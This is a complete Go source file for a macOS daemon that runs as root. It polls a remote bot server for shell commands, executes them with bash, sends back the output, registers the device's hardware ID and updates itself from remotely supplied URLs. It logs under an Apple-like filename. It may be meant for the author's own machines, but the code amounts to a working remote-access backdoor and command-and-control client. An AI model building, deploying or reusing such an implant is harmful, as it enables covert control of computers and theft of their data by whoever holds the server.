// mymac-agent – macOS persistent root daemon
// Boots → fetches server config from Vercel → connects to bot server → executes commands
// Config URL is the only thing baked in. Everything else is dynamic and updatable.
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/denisbrodbeck/machineid"
)

// ─── Baked in at build time via -ldflags ─────────────────────────────────────
// Only these values are baked in. Everything else comes from Vercel at runtime.
var (
	configServerURL = "https://mymac-config.vercel.app" // Vercel config server (permanent)
	adminToken      = "CHANGEME"                         // x-admin-token for Vercel
	agentVersion    = "2.0.0"
)

// ─── Runtime config (fetched from Vercel, refreshed every 5 min) ─────────────
type ServerConfig struct {
	ServerURL   string `json:"serverUrl"`
	AgentSecret string `json:"agentSecret"`
	Version     int    `json:"version"`
	UpdatedAt   string `json:"updatedAt"`
}

var (
	currentConfig     ServerConfig
	currentConfigMu   sync.RWMutex
	lastKnownVersion  int
	configPollInterval  = 5 * time.Minute
	cmdPollInterval     = 3 * time.Second
	heartbeatInterval   = 60 * time.Second
	updateInterval      = 1 * time.Hour
	updateInitialDelay  = 5 * time.Minute // wait after startup before first update check
	cmdTimeout          = 60 * time.Second
	logFile             = "/var/log/com.apple.sysmon.agent.log"
)

const (
	maxBinaryDownloadSize = 100 * 1024 * 1024 // 100 MB — agent binary
	assetDownloadTimeout  = 5 * time.Minute   // generous timeout for large binary downloads
	executableFileMode    = 0755
)

// ─── Device identity ──────────────────────────────────────────────────────────
var (
	deviceID string
	hostname string
)

func initIdentity() {
	h, _ := os.Hostname()
	hostname = h

	// Stable machine UUID using hardware serial — survives OS reinstall but is
	// consistent across reboots and user/password changes.
	id, err := machineid.ProtectedID("mymac-agent")
	if err != nil {
		// Fallback: sha256 of hostname + arch
		sum := sha256.Sum256([]byte(h + runtime.GOARCH))
		id = fmt.Sprintf("%x", sum[:16])
	}
	deviceID = id
}

// ─── HTTP helpers ─────────────────────────────────────────────────────────────
var httpClient = &http.Client{Timeout: 15 * time.Second}

func doRequest(baseURL, method, path, authHeader, authValue string, body interface{}) ([]byte, int, error) {
	var bodyReader io.Reader
	if body != nil {
		data, err := json.Marshal(body)
		if err != nil {
			return nil, 0, err
		}
		bodyReader = bytes.NewReader(data)
	}
	req, err := http.NewRequest(method, baseURL+path, bodyReader)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set(authHeader, authValue)
	req.Header.Set("bypass-tunnel-reminder", "true") // bypass localtunnel challenge page
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	respBody, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
	return respBody, resp.StatusCode, err
}

// Call Vercel config server
func vercelRequest(method, path string, body interface{}) ([]byte, int, error) {
	return doRequest(configServerURL, method, path, "x-admin-token", adminToken, body)
}

// Call bot server (uses current agentSecret)
func botRequest(method, path string, body interface{}) ([]byte, int, error) {
	currentConfigMu.RLock()
	url := currentConfig.ServerURL
	secret := currentConfig.AgentSecret
	currentConfigMu.RUnlock()
	if url == "" {
		return nil, 0, fmt.Errorf("server URL not configured yet")
	}
	return doRequest(url, method, path, "x-agent-secret", secret, body)
}

// ─── Config management ────────────────────────────────────────────────────────
func fetchConfig() (ServerConfig, error) {
	body, status, err := vercelRequest("GET", "/api/config", nil)
	if err != nil {
		return ServerConfig{}, err
	}
	if status != 200 {
		return ServerConfig{}, fmt.Errorf("config server returned %d", status)
	}
	var cfg ServerConfig
	if err := json.Unmarshal(body, &cfg); err != nil {
		return ServerConfig{}, err
	}
	return cfg, nil
}

func applyConfig(cfg ServerConfig) {
	currentConfigMu.Lock()
	defer currentConfigMu.Unlock()
	// Guard against an empty agentSecret overwriting a valid one (e.g. during a
	// fresh Firebase migration where the secret hasn't been set yet).
	if cfg.AgentSecret == "" && currentConfig.AgentSecret != "" {
		log.Printf("Warning: new config has empty agentSecret — keeping existing secret")
		cfg.AgentSecret = currentConfig.AgentSecret
	}
	currentConfig = cfg
	lastKnownVersion = cfg.Version
}

func configPoller() {
	for {
		time.Sleep(configPollInterval)
		cfg, err := fetchConfig()
		if err != nil {
			log.Printf("Config poll error: %v", err)
			continue
		}
		if cfg.Version != lastKnownVersion {
			log.Printf("Config updated (v%d → v%d) — switching to new server", lastKnownVersion, cfg.Version)
			applyConfig(cfg)
			// Send alert that config was picked up
			sendAlert(fmt.Sprintf("Agent on %s picked up new config v%d — connected to %s", hostname, cfg.Version, cfg.ServerURL))
		}
	}
}

// ─── Device registration ──────────────────────────────────────────────────────
func registerDevice() error {
	payload := map[string]string{
		"deviceId":     deviceID,
		"hostname":     hostname,
		"arch":         runtime.GOARCH,
		"agentVersion": agentVersion,
	}
	_, status, err := vercelRequest("POST", "/api/devices", payload)
	if err != nil {
		return err
	}
	if status != 200 {
		return fmt.Errorf("registration returned %d", status)
	}
	return nil
}

// ─── Heartbeat ────────────────────────────────────────────────────────────────
func heartbeatLoop() {
	for {
		time.Sleep(heartbeatInterval)
		body, status, err := vercelRequest("POST", "/api/devices/heartbeat", map[string]string{
			"deviceId":     deviceID,
			"hostname":     hostname,
			"arch":         runtime.GOARCH,
			"agentVersion": agentVersion,
		})
		if err != nil || status != 200 {
			log.Printf("Heartbeat failed: %v (status %d)", err, status)
			continue
		}
		// Check if config version changed — pick it up immediately
		var hbResp struct {
			ConfigVersion int `json:"configVersion"`
		}
		if err := json.Unmarshal(body, &hbResp); err == nil {
			if hbResp.ConfigVersion != lastKnownVersion {
				log.Printf("Heartbeat: config version mismatch (%d vs %d) — re-fetching", lastKnownVersion, hbResp.ConfigVersion)
				if cfg, err := fetchConfig(); err == nil {
					applyConfig(cfg)
				}
			}
		}
	}
}

// ─── Command execution ────────────────────────────────────────────────────────
func executeCommand(cmd string) (string, int) {
	ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
	defer cancel()

	c := exec.CommandContext(ctx, "/bin/bash", "-c", cmd)
	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out
	c.Env = []string{
		"HOME=/var/root",
		"USER=root",
		"LOGNAME=root",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/homebrew/bin",
		"SHELL=/bin/bash",
		"TERM=xterm-256color",
	}
	// Run in its own process group so the entire group can be killed on timeout.
	// Without this, killing bash leaves child processes (e.g. screencapture,
	// osascript) alive; they hold the stdout pipe open and c.Run() blocks forever.
	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	// Override the default cancel to kill the whole process group, not just bash.
	c.Cancel = func() error {
		if c.Process == nil {
			return nil
		}
		err := syscall.Kill(-c.Process.Pid, syscall.SIGKILL)
		if err != nil && err != syscall.ESRCH {
			log.Printf("kill process group -%d: %v", c.Process.Pid, err)
		}
		return err
	}
	// After the context fires and the group is killed, force-close any pipes
	// that are still open after a short grace period so c.Run() always returns.
	c.WaitDelay = 3 * time.Second

	err := c.Run()
	code := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			code = exitErr.ExitCode()
		} else {
			code = -1
			out.WriteString("\n[agent] " + err.Error())
		}
	}

	output := out.String()
	if len(output) > 500_000 {
		output = output[:500_000] + "\n…(truncated by agent)"
	}
	return output, code
}

// ─── Alert ────────────────────────────────────────────────────────────────────
func sendAlert(message string) {
	payload := map[string]string{"hostname": hostname, "message": message}
	_, _, _ = botRequest("POST", "/api/alert", payload)
}

// ─── Command poll loop ────────────────────────────────────────────────────────
func commandLoop() {
	consecutiveErrors := 0

	for {
		// Poll for a command for this specific device
		body, status, err := botRequest("GET", "/api/command?device="+deviceID, nil)
		if err != nil {
			consecutiveErrors++
			backoff := time.Duration(consecutiveErrors) * 5 * time.Second
			if backoff > 2*time.Minute {
				backoff = 2 * time.Minute
			}
			log.Printf("Poll error (#%d): %v — sleeping %s", consecutiveErrors, err, backoff)
			time.Sleep(backoff)
			continue
		}

		consecutiveErrors = 0

		if status == 204 {
			time.Sleep(cmdPollInterval)
			continue
		}

		if status != 200 {
			log.Printf("Unexpected poll status: %d", status)
			time.Sleep(cmdPollInterval)
			continue
		}

		var cmd struct {
			ID  string `json:"id"`
			Cmd string `json:"cmd"`
		}
		if err := json.Unmarshal(body, &cmd); err != nil {
			log.Printf("Parse error: %v", err)
			time.Sleep(cmdPollInterval)
			continue
		}

		// ── Special built-in commands ──────────────────────────────────────────
		if cmd.Cmd == "__update__" {
			log.Printf("Forced update check requested [%s]", cmd.ID[:8])
			statusMsg := runUpdateCheck() // exits on success; returns a string if not updated
			result := map[string]interface{}{
				"id":       cmd.ID,
				"deviceId": deviceID,
				"hostname": hostname,
				"output":   statusMsg,
				"exitCode": 0,
			}
			botRequest("POST", "/api/result", result) //nolint:errcheck
			continue
		}

		log.Printf("Execute [%s]: %s", cmd.ID[:8], cmd.Cmd)
		output, code := executeCommand(cmd.Cmd)
		log.Printf("Done    [%s]: exit=%d  %d bytes", cmd.ID[:8], code, len(output))

		result := map[string]interface{}{
			"id":       cmd.ID,
			"deviceId": deviceID,
			"hostname": hostname,
			"output":   output,
			"exitCode": code,
		}
		for attempt := 0; attempt < 5; attempt++ {
			_, status, err := botRequest("POST", "/api/result", result)
			if err == nil && status == 200 {
				break
			}
			log.Printf("Result post failed (attempt %d): %v status=%d", attempt+1, err, status)
			time.Sleep(3 * time.Second)
		}
	}
}

// ─── Self-update ──────────────────────────────────────────────────────────────
// The admin publishes a release via /setrelease in Telegram (or the CI workflow
// calls POST /api/release on Vercel). No GitHub token is required — the agent
// uses its existing adminToken to poll the Vercel config server.

type releaseInfo struct {
	Version     string `json:"version"`
	Arm64URL    string `json:"arm64Url"`
	Amd64URL    string `json:"amd64Url"`
	Arm64Sha256 string `json:"arm64Sha256"`
	Amd64Sha256 string `json:"amd64Sha256"`
}

// semverLess returns true if version a is older than version b.
// Both versions are expected to be in "vX.Y.Z" or "X.Y.Z" form.
func semverLess(a, b string) bool {
	parse := func(v string) [3]int {
		v = strings.TrimPrefix(v, "v")
		var nums [3]int
		for i, p := range strings.SplitN(v, ".", 3) {
			nums[i], _ = strconv.Atoi(p)
		}
		return nums
	}
	av, bv := parse(a), parse(b)
	for i := range av {
		if av[i] != bv[i] {
			return av[i] < bv[i]
		}
	}
	return false
}

// fetchRelease queries the Vercel config server for the latest published release.
func fetchRelease() (*releaseInfo, error) {
	body, status, err := vercelRequest("GET", "/api/release", nil)
	if err != nil {
		return nil, err
	}
	if status != 200 {
		return nil, fmt.Errorf("release endpoint returned %d", status)
	}
	var rel releaseInfo
	if err := json.Unmarshal(body, &rel); err != nil {
		return nil, err
	}
	return &rel, nil
}

// downloadBinary fetches a binary from any HTTPS URL using a plain GET request.
func downloadBinary(url string) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "mymac-agent/"+agentVersion)
	client := &http.Client{Timeout: assetDownloadTimeout}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("download returned %d", resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, maxBinaryDownloadSize))
}

// applyUpdate atomically replaces the running binary with newData and returns.
// The caller should exit immediately so LaunchDaemon restarts with the new binary.
func applyUpdate(newData []byte) error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("resolve executable: %w", err)
	}
	exe, err = filepath.EvalSymlinks(exe)
	if err != nil {
		return fmt.Errorf("resolve symlinks: %w", err)
	}
	tmp, err := os.CreateTemp(filepath.Dir(exe), ".mymac-update-*")
	if err != nil {
		return fmt.Errorf("create temp file: %w", err)
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath) // no-op if rename succeeded
	if _, err := tmp.Write(newData); err != nil {
		tmp.Close()
		return fmt.Errorf("write temp file: %w", err)
	}
	if err := tmp.Chmod(executableFileMode); err != nil {
		tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	if err := os.Rename(tmpPath, exe); err != nil {
		return fmt.Errorf("replace binary: %w", err)
	}
	return nil
}

// downloadAndApply downloads the new binary from url, verifies its SHA-256 (if
// expectedSHA is non-empty), and replaces the running binary on disk.
func downloadAndApply(url, binaryName, expectedSHA string) error {
	log.Printf("Downloading %s...", binaryName)
	data, err := downloadBinary(url)
	if err != nil {
		return fmt.Errorf("download binary: %w", err)
	}

	if expectedSHA != "" {
		sum := sha256.Sum256(data)
		if actual := fmt.Sprintf("%x", sum[:]); actual != expectedSHA {
			return fmt.Errorf("checksum mismatch: expected %s got %s", expectedSHA, actual)
		}
		log.Printf("Checksum verified for %s", binaryName)
	} else {
		log.Printf("Warning: no checksum for %s — skipping verification", binaryName)
	}

	return applyUpdate(data)
}

// runUpdateCheck performs a single update check and returns a human-readable
// status string (used by the __update__ command response).
// Returns true and calls os.Exit(0) if an update was successfully applied.
func runUpdateCheck() string {
	rel, err := fetchRelease()
	if err != nil {
		log.Printf("Update check error: %v", err)
		return fmt.Sprintf("Update check failed: %v", err)
	}
	if rel.Version == "" {
		log.Printf("Update check: no release published yet")
		return "No release published yet."
	}
	if !semverLess(agentVersion, rel.Version) {
		log.Printf("Update check: already on latest (%s)", agentVersion)
		return fmt.Sprintf("Already on latest version %s.", agentVersion)
	}

	log.Printf("New version available: %s → %s", agentVersion, rel.Version)

	var url, expectedSHA, binaryName string
	if runtime.GOARCH == "arm64" {
		url, expectedSHA, binaryName = rel.Arm64URL, rel.Arm64Sha256, "agent-darwin-arm64"
	} else {
		url, expectedSHA, binaryName = rel.Amd64URL, rel.Amd64Sha256, "agent-darwin-amd64"
	}

	if url == "" {
		msg := fmt.Sprintf("No download URL for %s in release %s", binaryName, rel.Version)
		log.Print(msg)
		return msg
	}
	if err := downloadAndApply(url, binaryName, expectedSHA); err != nil {
		log.Printf("Update failed: %v", err)
		return fmt.Sprintf("Update failed: %v", err)
	}
	sendAlert(fmt.Sprintf("Agent on %s updated %s → %s — restarting", hostname, agentVersion, rel.Version))
	log.Printf("Updated to %s — restarting", rel.Version)
	// LaunchDaemon's KeepAlive will immediately restart with the new binary.
	os.Exit(0)
	return "" // unreachable
}

func updatePoller() {
	time.Sleep(updateInitialDelay) // let the agent settle before the first check
	for {
		runUpdateCheck()
		time.Sleep(updateInterval)
	}
}

// ─── Main ─────────────────────────────────────────────────────────────────────
func main() {
	// Set up file logging
	if err := os.MkdirAll(filepath.Dir(logFile), 0750); err == nil {
		if f, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600); err == nil {
			log.SetOutput(io.MultiWriter(os.Stderr, f))
		}
	}
	log.SetFlags(log.Ldate | log.Ltime | log.Lmsgprefix)
	log.SetPrefix("[mymac-agent] ")

	initIdentity()
	log.Printf("Starting — hostname=%s deviceId=%s arch=%s version=%s", hostname, deviceID[:8], runtime.GOARCH, agentVersion)
	log.Printf("Config server: %s", configServerURL)

	// ── Step 1: Fetch config from Vercel (retry on errors only) ─────────────
	// We apply whatever we get — even an empty serverUrl — so that registration
	// (Step 2) can proceed immediately. The command loop handles the case where
	// serverUrl is not set yet, and the config poller will fill it in once the
	// admin runs /setserver.
	log.Println("Fetching config from Vercel...")
	for {
		cfg, err := fetchConfig()
		if err != nil {
			log.Printf("Config fetch error: %v — retrying in 10s", err)
			time.Sleep(10 * time.Second)
			continue
		}
		applyConfig(cfg)
		if cfg.ServerURL == "" {
			log.Printf("Config loaded v%d — serverUrl not set yet (admin must run /setserver). Registering anyway.", cfg.Version)
		} else {
			log.Printf("Config loaded v%d — server: %s", cfg.Version, cfg.ServerURL)
		}
		break
	}

	// ── Step 2: Register device on Vercel ─────────────────────────────────────
	// Registration targets the Vercel config server, not the bot server, so it
	// does not depend on serverUrl being set.
	for attempt := 0; attempt < 10; attempt++ {
		if err := registerDevice(); err != nil {
			log.Printf("Registration failed (attempt %d): %v", attempt+1, err)
			time.Sleep(10 * time.Second)
			continue
		}
		log.Printf("Device registered: %s (%s)", hostname, deviceID[:8])
		break
	}

	// ── Step 3: Alert bot server we're online ──────────────────────────────────
	go func() {
		time.Sleep(2 * time.Second) // let config settle
		sendAlert(fmt.Sprintf("Agent online\nHostname: %s\nArch: %s\nVersion: %s", hostname, runtime.GOARCH, agentVersion))
	}()

	// ── Step 4: Start background loops ────────────────────────────────────────
	go configPoller()
	go heartbeatLoop()
	go updatePoller()

	// ── Step 5: Command poll loop (blocks forever) ─────────────────────────────
	commandLoop()
}
